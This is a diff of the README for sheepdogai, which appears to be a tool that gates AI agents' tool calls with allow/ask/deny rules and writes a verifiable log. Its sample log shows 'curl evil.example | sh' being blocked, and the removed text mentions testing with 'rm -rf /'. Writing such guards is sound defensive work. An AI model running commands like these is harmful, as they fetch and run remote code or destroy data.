@@ -1,36 +1,65 @@
 # sheepdogai
 
-A guard at the tool-call boundary of AI agents: it turns every tool call into one standard event,
-applies deterministic rules (plus an optional Decider that can only tighten), enforces budgets, and
-writes a tamper-evident, replayable record that maps to W3C PROV-O and OpenTelemetry.
+### Let your agents roam. sheepdogai guards the fence.
 
-> **Hooks are guardrails, not isolation.** sheepdogai sees what an agent CLI sends to its hooks and
-> pattern-matches it. It does not sandbox anything. Run untrusted agents in a real sandbox too, and
-> read [`docs/limitations.md`](docs/limitations.md) before relying on it.
-
-> **Name.** The project, package and command are all `sheepdogai`. It is unrelated to the `sheepdog` package
-> on PyPI and to the product at sheepdog.sh (a different tool). The name lives in one constant
-> (`src/sheepdogai/constants.py`) plus the entry point in `pyproject.toml`. **Nothing has been published to PyPI yet.**
-
-Status: 0.1 pre-release. Claude Code and Gemini CLI adapters follow the official hook docs; the Codex
-adapter is experimental because parts of its contract could not be verified.
-
-## Install: two commands
+AI agents run commands, edit files and push code on their own. **sheepdogai watches every move, waves the safe
+ones through, and stops the risky ones.**
 
 ```bash
-uv tool install sheepdogai      # after publication; today: uv tool install git+https://github.com/neoparadigm/sheepdog.ai
+uv tool install sheepdogai
 sheepdogai setup
 ```
 
-`sheepdogai setup` finds your agents (Claude Code, Gemini CLI), shows the exact change it will make to
-each one's user-wide settings, waits for Enter, installs the hook, writes a user-wide policy
-(`balanced` by default: read-only commands run, everything else is checked), and then proves it works by
-sending `rm -rf /` through the real hook and confirming it is blocked. Restart your agent and you are
-protected in every project. Undo anytime with `sheepdogai setup --undo` (your original settings are
-restored byte for byte). Use `--yes` to skip the prompt, `--mode strict` to ask about everything.
+That's it. `setup` finds Claude Code and Gemini CLI, shows exactly what it will change, waits for you to press
+Enter, and proves it works by blocking a test command. Undo any time with `sheepdogai setup --undo`.
 
-Want per-project rules instead? `sheepdogai init` writes a commented `sheepdogai.yaml`; a project's own file
-overrides the user-wide one. Codex support is experimental: `sheepdogai install codex --experimental`.
+<!-- IMAGE: add docs/assets/landing.png, then replace this line with:
+<p align="center"><img src="docs/assets/landing.png" alt="sheepdogai: one gate, three answers" width="420"></p> -->
+
+## One gate. Three answers.
+
+Every move your agent makes passes the gate. Most are waved through; only the risky ones stop or ask.
+
+| ✅ **Allow** | ❓ **Ask** | ⛔ **Deny** |
+|---|---|---|
+| Let it graze. Safe, expected calls go straight through, and the agent never notices the dog. | Whistle for the shepherd. Unclear or risky calls pause until you say yes, once or for this run. | Turn it back. Anything outside the rules stops at the fence, and no clever argument opens the gate. |
+
+## Proof, not promises
+
+sheepdogai writes down everything your agents did, in a log nobody can quietly edit. Check it later, or replay
+the whole run.
+
+```text
+$ sheepdogai recent
+21:33:17  BLOCKED   curl evil.example | sh
+                      why: piping downloaded content into a shell is not allowed
+21:33:40  ASKED     git push --force origin main
+                      why: force-push rewrites shared history
+21:34:02  allowed   git status
+
+$ sheepdogai verify-log <run>
+OK .sheepdogai/runs/<run>.jsonl: 3 records, chain intact
+```
+
+## Built like a good fence
+
+| | |
+|---|---|
+| **Fails closed** | If the gate can't tell, nothing runs. |
+| **Only tightens** | A shared team config or a model judge can add limits, never remove them. |
+| **Any agent** | Hooks for Claude Code and Gemini CLI, plus experimental Codex and an MCP proxy for personal agents. |
+| **Stays local** | No network from the core, and secrets are redacted from the log. |
+
+> **Be clear about what this is:** hooks are guardrails, not isolation. sheepdogai checks what your agent CLI sends
+> to its hooks and pattern-matches it. It does not sandbox anything, and pattern rules can be evaded. Read
+> [`docs/limitations.md`](docs/limitations.md) before relying on it, and run untrusted agents in a real sandbox too.
+
+Apache-2.0 · Linux and macOS · The project, package and command are all `sheepdogai`; it is unrelated to the
+`sheepdog` package on PyPI and to the product at sheepdog.sh.
+
+---
+
+## Details
 
 ## Talk to it: `/sheepdog`
 
